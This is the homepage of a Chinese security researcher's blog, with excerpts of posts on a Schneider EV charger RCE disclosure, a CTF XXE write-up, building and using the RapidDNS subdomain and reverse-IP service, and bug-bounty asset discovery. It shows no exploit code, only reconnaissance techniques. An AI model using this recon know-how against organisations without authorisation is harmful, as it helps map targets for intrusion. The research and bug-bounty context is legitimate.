<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="BaCde&#39;s Blog。Security Research。">
<meta name="description" content="在攻与防的对立与统一中需求突破。">
<meta name="theme-color" content="#000">
<title>BaCde&#39;s Blog</title>
<link rel="shortcut icon" href="/favicon.ico?v=1628255121829">
<link rel="stylesheet" href="/styles/main.css">
<link rel="stylesheet" href="/media/css/gemini.css">

<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/github.css"
  rel="stylesheet">

<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>

<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script data-ad-client="ca-pub-8715625061980209" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-141762526-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());

  gtag('config', 'UA-141762526-1');
</script>


</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>BaCde&#39;s Blog</span>
            </a>  
          
        </div>
        
          <p class="subtitle">自由工作者，劈柴喂马周游世界</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item nav-item-active">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 主页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> 文章列表
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/prvJjB7Fua5//" target="_self">
                  <i class="fa fa-globe"></i> 汽车安全
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/G8-CImT42BP//" target="_self">
                  <i class="fa fa-globe"></i> 安全工具
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/JJyH5v-0vnk//" target="_self">
                  <i class="fa fa-globe"></i> 原创小说
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> 文章标签
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友情链接
                  
                </a>
              </li>
            
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout gemini ">
      <div class="section-layout-wrapper">
        <div id="sidebarMeta" class="sidebar">
    
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">BaCde</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">50</span>
        <span class="site-item-stat-name">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">147</span>
        <span class="site-item-stat-name">分类</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">147</span>
        <span class="site-item-stat-name">标签</span>
      </a>
    </div>
  </div>
  
    
      <div class="sidebar-item">
        <span class="site-item-rss">
            <i class="fa fa-rss"></i>
            <a href="https://bacde.me/atom.xml" target="_blank">RSS</a>
        </span>
      </div>
    
  
  
    <div class="sidebar-item sidebar-item-social">
      <div class="social-item">
        
          
            <a href="https://rapiddns.io">
              <i class="fa fa-globe" title="Rapiddns.io"></i>
            </a>
          
            <a href="https://github.com/insightglacier">
              <i class="fa fa-github-alt" title="Github"></i>
            </a>
          
            <a href="https://twitter.com/insightGlacier">
              <i class="fa fa-twitter" title="Twitter"></i>
            </a>
          
        
        
      </div>
    </div>
  


</div>
</div>
<script>
  let sidebarMeta = document.querySelector('#sidebarMeta');
  let scheme = 'gemini';
  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
    document.addEventListener('scroll', function(e) {
      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
        sidebarWrapper.classList.add('home-sidebar-fixed')
      } else {
        sidebarWrapper.classList.remove('home-sidebar-fixed')
      }
    });
  }
  </script>
        <div class="section-box gemini">
          <section class="section  posts-expand slide-down-in">
            
  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/Schneider-Charging-Staiong-Vulnerabilites/">
      施耐德充电桩漏洞挖掘之旅
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-08-04</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/vulnerabilites/">
        <span>Vulnerabilites</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/1DaHDVCRSr/">
        <span>漏洞挖掘</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/prvJjB7Fua5/">
        <span>automotive</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/RAyfn4bKtna/">
        <span>CVE</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>17分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>4067<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>大家好，我是BaCde，今天来说一说2020年底针对施耐德充电桩的漏洞挖掘过程。此次挖掘最终实现了通过远程无需用户交互场景下实现Root权限shell获取（一键远程Rootshell获取）。官方已经于今年7月份公布漏洞补丁以及相应的CVE编号。</p>
<h2 id="0x01-为什么选择施耐德">0x01 为什么选择施耐德？</h2>
<p>作为车联网安全研究来说，充电桩作为车联网必要组成部分，具备实际的研究价值与意义。而面临如此多的品牌，选择哪个目标作为研究对象是面临的第一个问题。为了能够更快的实现我选择了几个衡量指标，包括官方有响应中心、固件可下载、市面上可以买到、互联网上有暴露的目标。分别对应合法性、静态分析、动态测试、漏洞可产生实际的影响。</p>
<p>根据指标通过网络上去收集信息，最终将目标锁定在施耐德。同时，施耐德也在CVE官方的CNA列表中，报送的漏洞可以获得CVE编号。</p>
<h2 id="0x02-目标设定">0x02 目标设定</h2>
<p>确定了要研究的对象，接下来就要确定一下我们要实现什么样的效果。这可以使得在分析过程中保持聚焦，不偏离方向。目标设定如下：</p>
<ol>
<li>远程获取设备Root权限</li>
<li>无需登录，无需交互</li>
</ol>
<p>根据上述设定最直接的方式就是寻找远程命令执行漏洞，即要RCE类型漏洞。</p>
<h2 id="0x03-信息收集">0x03 信息收集</h2>
<p>一切准备就绪，开始我们的漏洞挖掘之旅。</p>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/Schneider-Charging-Staiong-Vulnerabilites/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/RapidDNS-tips-1/">
      如何高效使用RapidDNS
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-06-19</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/rapiddns/">
        <span>RapidDNS</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/8pBIONj51ua/">
        <span>tips</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>2分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>478<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>大家好，我是BaCde。沉默了了有一段时间，最近一直在边开发边思考网站的发展。思考了很多，所以网站和公众号的更新就慢下来了。后续会多发一些跟网络安全相关的一些内容。</p>
<p>今天来分享点关于RapidDNS使用的小技巧。</p>
<h2 id="linux-命令快速查询">Linux 命令快速查询</h2>
<p>将以下命令加入到 <code>bash_profile</code>文件中。</p>
<pre><code>rapiddns(){
	curl -s &quot;https://rapiddns.io/subdomain/$1?full=1&quot; \
	| grep -oP '_blank&quot;&gt;\K[^&lt;]*' \
	| grep -v http \
	| sort -u 
}
</code></pre>
<p>然后后面就可以使用rapiddns命令直接查询结果。</p>
<p><code>rapiddns tesla.com</code></p>
<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1624078793937.jpg" alt="" loading="lazy"></figure>
<h2 id="浏览器搜索引擎快速查询">浏览器搜索引擎快速查询</h2>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/RapidDNS-tips-1/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/">
      Cyber Apocalypse 2021 Web Artillery WriteUP
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-04-28</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/fghQ27byw/">
        <span>WriteUP</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/RS0rtshx-O/">
        <span>CTF</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/xkpjq3sx6J/">
        <span>XXE</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/ItRx6SRfOt/">
        <span>Cyber Apocalypse 2021</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>5分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>1148<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。</p>
<h2 id="收集信息">收集信息</h2>
<p>此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。</p>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/RapidDNS-03/">
      我是如何低成本建立RapidDNS.io网站的
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-03-22</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/EzV5FcSmWF/">
        <span>rapiddns</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/h385mUgQv1/">
        <span>dns</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/25Bn_NFyM6/">
        <span>rapid7</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>9分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>2286<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。</p>
<p>RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。</p>
<p>接下来我就跟大家分享建设这个网站的过程。</p>
<h2 id="产生想法">产生想法</h2>
<p>2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。</p>
<p>有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。</p>
<h2 id="面临的问题">面临的问题</h2>
<p>开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。</p>
<p>先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。</p>
<p>因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。</p>
<p>另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。</p>
<p>但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。</p>
<h2 id="解决方案">解决方案</h2>
<p>经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。</p>
<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1616415608484.png" alt="" loading="lazy"></figure>
<p>本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。</p>
<p>外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。</p>
<p>这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。</p>
<p>以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。</p>
<h2 id="编码">编码</h2>
<p>需要的一些基础知识：</p>
<ol>
<li>html+javascript+css基础</li>
<li>python+flask基础</li>
<li>elasticsearch基础</li>
</ol>
<p>其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。</p>
<p>主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。</p>
<p>后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：</p>
<figure data-type="image" tabindex="2"><img src="https://bacde.me/post-images/1616415600955.png" alt="" loading="lazy"></figure>
<p>创建mapping：</p>
<pre><code>{
  &quot;mappings&quot;: {
    &quot;domain&quot;: {
      &quot;properties&quot;: {
        &quot;name&quot;: {
          &quot;type&quot;: &quot;text&quot;

        },
        &quot;type&quot;: {
          &quot;type&quot;: &quot;keyword&quot;

        },
        &quot;value&quot;: {
          &quot;type&quot;: &quot;ip&quot;

        },
        &quot;domain&quot;: {
          &quot;type&quot;: &quot;keyword&quot;

        }
      }
    }
  }
}
</code></pre>
<p>最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。</p>
<p>修改index设置的方法：</p>
<pre><code>{
  &quot;index&quot;: {
    &quot;refresh_interval&quot;: -1,
    &quot;number_of_replicas&quot;: 0
  }
}
</code></pre>
<p>导入完成后在修改回去即可。</p>
<p>以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。</p>
<h2 id="总结">总结</h2>
<p>其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。</p>
<p>希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。</p>
<p>最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。<br>
所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。</p>
<p>大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。</p>
<center>
<figure data-type="image" tabindex="3"><img src="https://bacde.me/post-images/1615992545149.jpg" alt="" loading="lazy"></figure>
</center>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/RapidDNS-03/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/RapidDNS-02/">
      RapidDNS网站在SRC漏洞挖掘中的一个思路
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-03-17</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/1DaHDVCRSr/">
        <span>漏洞挖掘</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/DNju50k28s/">
        <span>SRC</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/1MYQiPMglB/">
        <span>信息收集</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/K5TznCnEqt/">
        <span>证书搜索</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>2分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>563<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。</p>
<p>首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。</p>
<p>当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。</p>
<p>像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。</p>
<p>RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。</p>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/RapidDNS-02/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/rapiddnsio-tips/">
      RapidDNS.IO 网站应用实例
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-03-11</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/EzV5FcSmWF/">
        <span>rapiddns</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/muqf52BmZa/">
        <span>pentest</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/nnNW5XSbey/">
        <span>recon</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/4Kye_-0A5I/">
        <span>bug bounty</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>3分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>765<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。</p>
<p>网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。</p>
<p>首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。</p>
<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1615429646070.png" alt="" loading="lazy"></figure>
<p>下面来说下实际应用场景。</p>
<h2 id="信息收集">信息收集</h2>
<p>在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。</p>
<p>比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。</p>
<figure data-type="image" tabindex="2"><img src="https://bacde.me/post-images/1615429652715.png" alt="" loading="lazy"></figure>
<p>下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。</p>
<figure data-type="image" tabindex="3"><img src="https://bacde.me/post-images/1615429659028.png" alt="" loading="lazy"></figure>
<h2 id="溯源定位">溯源定位</h2>
<p>这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。</p>
<p>这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？</p>
<p>今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。</p>
<p>其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。</p>
<figure data-type="image" tabindex="4"><img src="https://bacde.me/post-images/1615429676971.png" alt="" loading="lazy"></figure>
<p>在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。</p>
<figure data-type="image" tabindex="5"><img src="https://bacde.me/post-images/1615429683321.png" alt="" loading="lazy"></figure>
<p>好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。</p>
<p>扫描篇下方二维码可关注公众号</p>
<figure data-type="image" tabindex="6"><img src="https://bacde.me/post-images/1615429807479.jpg" alt="" loading="lazy"></figure>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/rapiddnsio-tips/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/sourcemapx/">
      SourceMapX——批量扫描并恢复sourcemap的源代码文件
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2021-02-28</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/1DaHDVCRSr/">
        <span>漏洞挖掘</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/DNju50k28s/">
        <span>SRC</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/Svviomjq-Y/">
        <span>sourcemap</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/7vkFDlvcbw/">
        <span>webpack</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>2分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>341<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。</p>
<p>项目地址:<br>
